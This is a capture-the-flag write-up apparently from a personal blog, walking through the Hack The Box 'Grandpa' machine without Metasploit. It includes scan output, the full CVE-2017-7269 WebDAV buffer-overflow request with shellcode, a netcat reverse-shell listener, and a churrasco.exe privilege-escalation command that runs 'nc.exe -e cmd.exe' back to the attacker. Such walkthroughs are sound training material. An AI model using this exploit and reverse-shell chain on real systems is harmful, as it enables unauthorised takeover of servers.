---
title: Hack The Box - Grandpa (Without Metasploit)
date: 2021-01-16 21:56:00 +0800
categories: [hackthebox]
tags: [windows, webdav, churrasco]
---

![](/assets/images/grandpa.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.14 grandpa.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a grandpa.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.14:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 10:51 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Initiating Connect Scan at 10:51
Scanning grandpa.htb (10.10.10.14) [1 port]
Discovered open port 80/tcp on 10.10.10.14
Completed Connect Scan at 10:51, 0.01s elapsed (1 total ports)
Initiating Service scan at 10:51
Scanning 1 service on grandpa.htb (10.10.10.14)
Completed Service scan at 10:51, 6.14s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.14.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Nmap scan report for grandpa.htb (10.10.10.14)
Host is up, received user-set (0.012s latency).
Scanned at 2021-01-16 10:51:50 UTC for 6s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 16 Jan 2021 10:51:56 GMT
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

# Enumeration (1)

## Port 80 `Microsoft IIS httpd 6.0`

![](/assets/images/grandpa1.png)

Seems like there is nothing here. Lets run `nikto` to see if there is anything.

```bash
$ nikto -host http://grandpa.htb                  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    grandpa.htb
+ Target Port:        80
+ Start Time:         2021-01-16 05:53:24 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND LOCK MKCOL UNLOCK COPY SEARCH PROPPATCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 7937 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2021-01-16 05:55:37 (GMT-5) (133 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The results say that `WebDAV` is enabled. However, when I performed directory bruteforcing, I couldn't find any new directories. Hence I ran `davtest` on `http://grandpa.htb/` but no tests were successful.

```bash
$ perl davtest.pl -url http://grandpa.htb -move -copy -cleanup
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://grandpa.htb
********************************************************
NOTE    Random string for this session: xWiamzHW3o3bod
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files (MOVE method)
PUT     php     FAIL
PUT     html    FAIL
PUT     txt     FAIL
PUT     jhtml   FAIL
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     cfm     FAIL
PUT     jsp     FAIL
PUT     cgi     FAIL
PUT     asp     FAIL
PUT     pl      FAIL
********************************************************
 Sending test files (COPY method)
PUT     php     FAIL
PUT     html    FAIL
PUT     txt     FAIL
PUT     jhtml   FAIL
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     cfm     FAIL
PUT     jsp     FAIL
PUT     cgi     FAIL
PUT     asp     FAIL
PUT     pl      FAIL
********************************************************
 Cleaning up

********************************************************
davtest.pl Summary:
```

Hence, I move on to searching for exploits using `searchsploit`.

```bash
$ searchsploit iis 6.0
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                      | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                               | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                 | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                          | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                              | windows/remote/41738.py
...
```

It seems that this version of `IIS` has a remote buffer overflow vulnerability. 

# Exploitation (1)

However, this script did not work, hence I found a working alternative [here](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269).

Before running the exploit, we will need to start a `nc` listener.

```bash
$ rlwrap nc -lvnp 1337                         
listening on [any] 1337 ...
```

We then run the exploit:

```bash
$ python s.py grandpa.htb 80 10.10.XX.XX 1337
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾  Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A
```

On our listener, we get a shell as `NETWORK SERVICE`!

```bash
$ rlwrap nc -lvnp 1337                       
listening on [any] 1337 ...

connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.14] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
whoami
whoami
nt authority\network service
```

# Exploitation (2)

Running `systeminfo`, we see that it is running `Windows Server 2003`. Checking `searchsploit`, we see that there is a privilege escalation exploit we can use!

```bash
$ searchsploit windows server 2003 privilege Escalation
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (1)  | windows/local/22882.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (2)  | windows/local/22883.c
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation         | windows/local/6705.txt
```

We can get a binary called `churrasco.exe` from [here](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe) which will take in a command and run it as `NT AUTHORITY/SYSTEM`. After transferring it and a `nc.exe`, over via `HTTP`, we can use it to run a reverse shell.

```
c:\windows\system32\inetsrv> C:\tmp\churrasco.exe "C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
```

Then on our listener that we set up beforehand, we get a shell as `SYSTEM`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.15] 1242
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP> whoami
whoami
nt authority\system
```

# user.txt

The user flag is in `Harry`'s Desktop.

```
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff5ec67c3cff017f2bedc146a5d869
```

# root.txt

The root flag is in `Administrator`'s Desktop.

```
C:\WINDOWS\TEMP> type "C:\Documents and Settings\Administrator\Desktop\user.txt"
9359e905a2c35f861f6a57cecf28bb7b
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !